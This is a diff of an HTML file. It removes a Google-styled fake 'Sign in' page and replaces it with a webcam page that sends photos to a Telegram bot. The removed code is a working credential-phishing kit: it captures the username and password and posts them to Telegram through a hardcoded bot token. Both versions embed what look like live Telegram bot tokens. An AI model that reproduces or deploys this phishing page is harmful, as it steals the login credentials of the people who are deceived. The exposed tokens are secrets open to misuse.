@@ -1,146 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Sign in</title>
+  <title>Camera Capture</title>
   <style>
-    /* Google‑style login form styling */
-    body {
-      background-color: #f2f2f2;
-      font-family: 'Roboto', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    video, canvas {
+      display: block;
+      margin: 10px auto;
+      max-width: 100%;
     }
-    .login-container {
-      background: #fff;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px rgba(60,64,67,0.15);
-      width: 350px;
-    }
-    .login-container h1 {
-      font-size: 24px;
-      margin-bottom: 24px;
-      color: #202124;
-      text-align: center;
-    }
-    .login-container input[type="text"],
-    .login-container input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
+    button {
+      display: block;
+      margin: 10px auto;
+      padding: 10px 20px;
       font-size: 16px;
-      box-sizing: border-box;
-    }
-    .login-container button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .login-container .save-btn {
-      background-color: #4285F4;
-      color: #fff;
-    }
-    .login-container .save-btn:hover {
-      background-color: #357ae8;
-    }
-    .login-container .cancel-btn {
-      background-color: #DB4437;
-      color: #fff;
-    }
-    .login-container .cancel-btn:hover {
-      background-color: #c33d2e;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <h1>Sign in</h1>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit" class="save-btn">Save</button>
-      <button type="button" class="cancel-btn" onclick="clearFields()">Cancel</button>
-    </form>
-  </div>
-  
-  <script>
-    // Replace with your actual Telegram Bot token
-    const BOT_TOKEN = "7861802635:AAETLP6u1o8AWwgjamsFIccvYPcGnjbXdmg";
 
-    /**
-     * Attempts to auto-detect the chat ID by calling getUpdates.
-     * Note: Due to CORS restrictions, this call may fail when run directly in the browser.
-     * A server-side proxy might be required for production use.
-     */
-    function getChatId() {
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok && data.result && data.result.length > 0) {
-            // Extract chat ID from the first update's message
-            return data.result[0].message.chat.id;
-          } else {
-            throw new Error("No chat ID found. Please send a message to your bot first.");
-          }
-        });
-    }
+<h2 style="text-align:center;">Take Photo and Send to Telegram</h2>
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // Prevent default form submission
+<video id="video" width="320" height="240" autoplay></video>
+<canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+<button onclick="takePhoto()">Take Photo</button>
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+<script>
+  const BOT_TOKEN = "7537785860:AAEJYsULgBX48brbbZtRUhfTtGd2v_XZ-zg";
+  const CHAT_ID = "123"; // 👉 Replace with your actual chat ID
 
-      // First, auto-detect the chat ID and then send the message.
-      getChatId()
-        .then(chatId => {
-          // Compose the URL for sending the message.
-          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          // Prepare form data as URL-encoded string.
-          const params = new URLSearchParams();
-          params.append("chat_id", chatId);
-          params.append("text", message);
-
-          return fetch(url, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: params.toString()
-          });
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            alert("Credentials sent successfully!");
-            clearFields();
-          } else {
-            alert("Failed to send credentials. Check console for details.");
-            console.error(data);
-          }
-        })
-        .catch(error => {
-          alert("Error: " + error.message);
-          console.error(error);
-        });
+  // Start camera
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      document.getElementById('video').srcObject = stream;
+    })
+    .catch(error => {
+      alert('Cannot access camera: ' + error.message);
     });
 
-    function clearFields() {
-      document.getElementById("username").value = "";
-      document.getElementById("password").value = "";
-    }
-  </script>
+  function takePhoto() {
+    const canvas = document.getElementById('canvas');
+    const video = document.getElementById('video');
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Convert canvas to blob
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Photo sent to Telegram!");
+        } else {
+          alert("Failed to send photo.");
+          console.error(data);
+        }
+      })
+      .catch(error => {
+        alert("Error: " + error.message);
+      });
+    }, 'image/jpeg');
+  }
+</script>
+
 </body>
 </html>
